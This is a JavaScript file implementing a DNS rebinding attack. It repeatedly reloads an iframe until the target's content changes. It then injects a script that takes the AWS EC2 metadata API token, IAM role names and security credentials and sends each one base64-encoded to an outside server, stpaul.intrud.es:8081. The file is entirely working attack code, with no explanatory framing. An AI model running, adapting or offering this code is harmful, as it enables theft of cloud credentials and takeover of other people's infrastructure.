async function run() {
    // Wait for the iFrame to load
    while (true) {
        let frame = document.getElementById("frame")
        if (!frame) {
            await new Promise(r => setTimeout(r, 100))
            continue
        }
        break
    }
    frame.onload = onFrameLoad
    frame.src = `${window.location}token.txt`
}

function onFrameLoad() {
    // Keep refereshing the iFrame until the token changes, indicating that DNS rebinding has worked
    let token = "testtoken"
    let doc = frame.contentDocument || frame.contentWindow.document
    let content = doc.body.innerText.trim()
    console.log(content)
    console.log(token)
    if (content != token) { // Rebinding has worked
        injectScript(frame)
        return
    }

    // Refresh the frame to try again
    frame.src = `${window.location}token.txt`
}

function injectFunc() {
    let debug = false
    let exfilServer = "http://stpaul.intrud.es:8081/"

    // This solves encoding issues found with the GCP metadata server
    function b64encode(text) {
        return btoa(unescape(encodeURIComponent(text)))
    }

    function exfil(data) {
        if (debug) {
            console.log(data)
        }
        fetch(`${exfilServer}?msg=${b64encode(data)}`)
    }

    function fetchMetdataAWS(headers = {}) {
        fetch("/latest/meta-data/iam/security-credentials", {
            headers: headers
        })
            .then(resp => {
                if (resp.status == 404) {
                    exfil("No roles found")
                } else {
                    return resp.text()
                }
            })
            .then(text => {
                exfil(`Found roles: ${text}`)
                let firstRole = text.split("\n")[0]
                return fetch(`/latest/meta-data/iam/security-credentials/${firstRole}`, {
                    headers: headers
                })
            })
            .then(resp => resp.text())
            .then(text => {
                exfil(`Found credentials: ${text}`)
            })
            .catch(err => {
                exfil(`Error: ${err}`)
            })
    }

    function fetchMetdataAWSv2() {
        let token = ""
        let method = "PUT"
        if (debug) {
            method = "GET"
        }
        fetch("/latest/api/token", {
            method: method,
            headers: {
                "X-aws-ec2-metadata-token-ttl-seconds": "21600"
            }
        })
            .then(resp => resp.text())
            .then(text => {
                token = text
                console.log(`Found token: ${token}`)
                exfil(`API token: ${token}`)
                let headers = {
                    "X-aws-ec2-metadata-token": token
                }
                fetchMetdataAWS(headers)
            })
    }

    fetchMetdataAWSv2()
}

function injectScript(frame) {
    let doc = frame.contentDocument || frame.contentWindow.document
    let script = document.createElement("script")
    script.setAttribute("type", "text/javascript")
    script.innerHTML = `${injectFunc.toString()}; injectFunc()`
    doc.body.append(script)
}

// Block our IP address
fetch("/block")
    .finally(_ => {
        run()
    })
